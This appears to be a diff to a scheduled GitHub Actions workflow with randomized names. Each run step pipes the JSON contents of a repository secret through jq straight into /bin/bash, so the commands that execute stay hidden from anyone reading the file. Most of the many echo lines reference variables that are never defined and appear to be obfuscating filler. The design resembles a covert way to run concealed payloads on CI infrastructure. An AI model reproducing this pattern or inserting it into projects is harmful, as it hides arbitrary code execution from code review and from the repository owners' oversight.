@@ -1,26 +1,35 @@
 name: chunnainium
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 4/6 * * *'
+    - cron: '22 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: chunnainium
         env:
-          hbyg6142: ${{ secrets.hbyg6142 }}
+          es13255: ${{ secrets.es13255 }}
         run: |
-          echo $hbyg6142 | jq -r .an81125 | /bin/bash
-          echo $rreg2573 | jq -r .lb040 | /bin/bash
-          echo $ty582 | jq -r .gt4 | /bin/bash
-          echo $nz6 | jq -r .fj977 | /bin/bash
-          echo $mrfcj5 | jq -r .s56912 | /bin/bash
-          echo $iiq48 | jq -r .dryih87439 | /bin/bash
-          echo $caxfa1 | jq -r .kjlx725 | /bin/bash
-          echo $vin5 | jq -r .ryr36 | /bin/bash
-          echo $bbxme7 | jq -r .qubzh9 | /bin/bash
-          echo $jzytu30213 | jq -r .byq17982 | /bin/bash
+          echo $es13255 | jq -r .jddga27 | /bin/bash
+          echo $chezy787 | jq -r .paua5642 | /bin/bash
+          echo $uu008 | jq -r .djr751 | /bin/bash
+          echo $rzqgz20 | jq -r .ey7271 | /bin/bash
+          echo $aafe76481 | jq -r .rhe863 | /bin/bash
+          echo $jrcf33 | jq -r .mnj4 | /bin/bash
+          echo $vrpnd2 | jq -r .i9 | /bin/bash
+          echo $wivzj18059 | jq -r .zooz92511 | /bin/bash
+          echo $m93099 | jq -r .bd4 | /bin/bash
+          echo $lv5 | jq -r .kph4 | /bin/bash
+          echo $ebnt4900 | jq -r .c104 | /bin/bash
+          echo $walm34123 | jq -r .ke9118 | /bin/bash
+          echo $uhzql8528 | jq -r .nstt9 | /bin/bash
+          echo $hk12069 | jq -r .vod12 | /bin/bash
+          echo $naf26143 | jq -r .rjao32 | /bin/bash
+          echo $qafap9 | jq -r .xpuke717 | /bin/bash
+          echo $bgnt9146 | jq -r .a91 | /bin/bash
+          echo $rhivo89037 | jq -r .npvq4 | /bin/bash
+          echo $kj16667 | jq -r .zmq12676 | /bin/bash
 
